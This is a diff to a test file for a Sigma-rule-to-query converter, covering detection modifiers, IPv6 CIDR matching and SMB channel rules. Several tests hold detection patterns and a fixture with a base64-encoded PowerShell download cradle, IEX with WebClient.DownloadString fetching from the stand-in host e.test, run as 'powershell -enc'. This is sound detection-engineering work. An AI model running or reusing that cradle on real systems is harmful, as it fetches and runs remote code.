@@ -99,11 +99,11 @@ level: low
 """
 
 UNSUPPORTED = """
-title: Base64 Offset
+title: Field Reference
 logsource: {product: windows, category: process_creation}
 detection:
   selection:
-    CommandLine|base64offset|contains: 'IEX'
+    CommandLine|fieldref: ParentCommandLine
   condition: selection
 level: high
 ---
@@ -244,7 +244,7 @@ def test_modifiers():
 def test_unsupported_constructs_are_skipped_not_weakened():
     res = sigma.convert_text(UNSUPPORTED)
     assert [r["ok"] for r in res] == [False, False, False, False]
-    assert "base64offset" in res[0]["error"]
+    assert "fieldref" in res[0]["error"]
     assert "linux" in res[1]["error"]
     assert "aggregation" in res[2]["error"]
     assert "2 of" in res[3]["error"]
@@ -285,3 +285,99 @@ detection:
 """
     r = sigma.convert_text(text, "logoff.yml")[0]
     assert not r["ok"] and "informational" in r["error"]
+
+
+def test_neq_cased_and_regex_flags_keep_their_meaning():
+    # |neq came out as an equality (the rule inverted), |cased and the regex flags m / s were
+    # dropped, and modifiers REMN does not know were ignored.
+    w: list[str] = []
+    assert sigma.compile_field("CommandLine|neq", "foo", {}, w) == {"not": {"commandLine": "foo"}}
+    assert sigma.compile_field("CommandLine|neq", ["a", "b"], {}, w) == {"any_of": [{"not": {"commandLine": "a"}}, {"not": {"commandLine": "b"}}]}
+    assert sigma.compile_field("CommandLine|neq|all", ["a", "b"], {}, w) == {"all_of": [{"not": {"commandLine": "a"}}, {"not": {"commandLine": "b"}}]}
+    assert sigma.compile_field("CommandLine|contains|cased", "hTTp", {}, w) == {"commandLine|contains_cs": "hTTp"}
+    assert sigma.compile_field("CommandLine|re|s", "a.b", {}, w) == {"commandLine|re": "(?s)a.b"}
+    assert sigma.compile_field("CommandLine|re|m", "(?i)^x$", {}, w) == {"commandLine|re": "(?im)^x$"}
+    for field in ("EventTime|hour", "CommandLine|bogus", "CommandLine|s", "CommandLine|base64|wide|contains"):
+        with pytest.raises(sigma.Unsupported):
+            sigma.compile_field(field, "value", {}, w)
+
+
+def test_base64_and_wide_encodings_find_the_value_at_every_alignment():
+    import base64 as b64
+
+    variants = sigma.compile_field("CommandLine|base64offset|contains", "IEX (New", {}, [])["commandLine|contains_cs"]
+    wide = sigma.compile_field("CommandLine|wide|base64offset|contains", "IEX (New", {}, [])["commandLine|contains_cs"]
+    for pad in range(6):
+        assert any(v in b64.b64encode(b"x" * pad + b"IEX (New-Object Net.WebClient)").decode() for v in variants), pad
+        assert any(v in b64.b64encode(("x" * pad + "IEX (New-Object Net.WebClient)").encode("utf-16-le")).decode() for v in wide), pad
+    assert not any(v in b64.b64encode(b"Get-ChildItem -Recurse").decode() for v in variants)
+    assert sigma.compile_field("CommandLine|base64|contains", "http://", {}, []) == {"commandLine|contains_cs": "aHR0cDovLw=="}
+
+
+def test_ipv6_cidrs_translate_exactly():
+    import re as _re
+
+    cond = sigma.compile_field("DestinationIp|cidr", ["::1/128", "fe80::/10", "fc00::/7"], {}, [])["any_of"]
+    assert set(cond[0]["destinationIp|in"]) >= {"::1", "0:0:0:0:0:0:0:1"}
+    link, ula = cond[1]["destinationIp|re"], cond[2]["destinationIp|re"]
+    assert all(_re.match(link, a, _re.I) for a in ("fe80::1", "FE80::abcd:1", "febf::1", "fe80::80ac:4126:fa58:1b81%10"))
+    assert not any(_re.match(link, a, _re.I) for a in ("fec0::1", "fe7f::1", "2001:db8::1"))
+    assert all(_re.match(ula, a, _re.I) for a in ("fc00::1", "fd12:3456::9"))
+    assert not _re.match(ula, "fe80::1", _re.I)
+    with pytest.raises(sigma.Unsupported):
+        sigma.compile_field("DestinationIp|cidr", "2001:db8::/32", {}, [])
+
+
+def test_new_translations_run_on_the_sql_engine(store):
+    import base64 as b64
+
+    rule = sigma.convert_text(
+        """
+title: Encoded IEX outside the admin console
+logsource: {product: windows, category: process_creation}
+detection:
+  enc:
+    CommandLine|wide|base64offset|contains: 'IEX (New'
+  multiline:
+    CommandLine|re|s: 'begin.end'
+  admin:
+    ParentImage|neq: 'C:\\Admin\\console.exe'
+  condition: (enc or multiline) and admin
+level: high
+"""
+    )[0]
+    assert rule["ok"], rule
+    payload = b64.b64encode("x; IEX (New-Object Net.WebClient).DownloadString('http://e.test')".encode("utf-16-le")).decode()
+    sysmon = "Microsoft-Windows-Sysmon/Operational"
+    w = EventWriter(store, 1)
+    for command, parent in (
+        (f"powershell -enc {payload}", "C:\\Windows\\explorer.exe"),
+        (f"powershell -enc {payload}", "C:\\Admin\\console.exe"),
+        ("begin\nend", "C:\\Windows\\explorer.exe"),
+        ("powershell -enc " + payload.lower(), "C:\\Windows\\explorer.exe"),
+    ):
+        w.add(_ev(eventId=1, channel=sysmon, image="C:\\Windows\\powershell.exe", commandLine=command, parentImage=parent))
+    w.flush()
+    found = R.run_rule(store, rule["rule"], {})
+    assert sorted(r for f in found for r in f["refs"]) == [1, 3]
+
+
+def test_smb_server_connectivity_rules_read_their_channel(store):
+    res = sigma.convert_text(
+        """
+title: Share connection without signing
+logsource: {product: windows, service: smbserver-connectivity}
+detection:
+  selection:
+    EventID: 4000
+  condition: selection
+level: medium
+"""
+    )[0]
+    assert res["ok"] and not res["warnings"], res
+    w = EventWriter(store, 1)
+    w.add(_ev(eventId=4000, channel="Microsoft-Windows-SMBServer/Connectivity"))
+    w.add(_ev(eventId=4000, channel="Microsoft-Windows-SmbClient/Connectivity"))
+    w.flush()
+    found = R.run_rule(store, res["rule"], {})
+    assert sorted(r for f in found for r in f["refs"]) == [1]
